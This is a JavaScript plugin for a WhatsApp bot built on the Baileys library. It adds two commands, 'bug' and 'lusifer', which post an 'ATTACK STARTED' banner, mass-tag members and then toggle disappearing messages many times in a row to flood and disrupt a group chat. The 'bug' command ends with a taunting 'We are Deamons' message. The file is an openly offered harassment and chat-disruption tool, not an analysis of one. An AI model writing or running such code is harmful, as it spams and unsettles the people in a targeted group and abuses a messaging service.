/* Copyright (C) 2021 TENUX-Neotro.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
NEOTROX - TEENUHX
*/

const {MessageType, GroupSettingChange} = require('@adiwajshing/baileys');
const Asena = require('../events');
const Config = require('../config');
const UNQ = "wrong command dont type words after command"
const code1 = ('π\n\nββββ ' + Config.BOT_NAME + ' ATTACK STARTEDπΎ...βββ')
const code2 = ('ββββββ ' + Config.BOT_NAME + '  *β We are Deamons Do not run away...β * \nα΄α΄α΄‘α΄Κα΄α΄ ΚΚ πΈκ±α΄α΄κ°α΄Ι΄Ιͺα΄πΈ')
const Language = require('../language');
const Lang = Language.getString('amazone');
const mut = Language.getString('mute');


async function checkImAdmin(message, user = message.client.user.jid) {
    var grup = await message.client.groupMetadata(message.jid);
    var sonuc = grup['participants'].map((member) => {
        
        if (member.jid.split("@")[0] == user.split("@")[0] && member.isAdmin) return true; else; return false;
    });
    return sonuc.includes(true);
}

Asena.addCommand({pattern: 'bug ?(.*)', fromMe: true, desc: Lang.NEED_REPLY,deleteCommand: true}, (async (message, match) => {    
        if (match[1] == '') {
            await message.client.toggleDisappearingMessages(message.jid, 64000);
            await message.client.sendMessage(message.jid,code1,MessageType.text);
            await message.client.sendMessage(message.jid,".tagall",MessageType.text);
            await message.client.toggleDisappearingMessages(message.jid, 64000);
            await message.client.toggleDisappearingMessages(message.jid, 64000);
            await message.client.toggleDisappearingMessages(message.jid, 64000);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 64000);
            await message.client.toggleDisappearingMessages(message.jid, 64000);
            await message.client.sendMessage(message.jid,code2,MessageType.text);
        }
        else {
            return await message.client.sendMessage(message.jid, UNQ, MessageType.text);
        }

}));


Asena.addCommand({pattern: 'lusifer ?(.*)', fromMe: true, desc: Lang.NEED_REPLY, deleteCommand: true}, (async (message, match) => {    
        if (match[1] == '') {
            await message.client.sendMessage(message.jid,".tagall",MessageType.text);
            await message.client.sendMessage(message.jid,code1,MessageType.text);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            
        }
        else {
            return await message.client.sendMessage(message.jid, UNQ, MessageType.text);
        }

}));





          



module.exports = {
    checkImAdmin: checkImAdmin
};
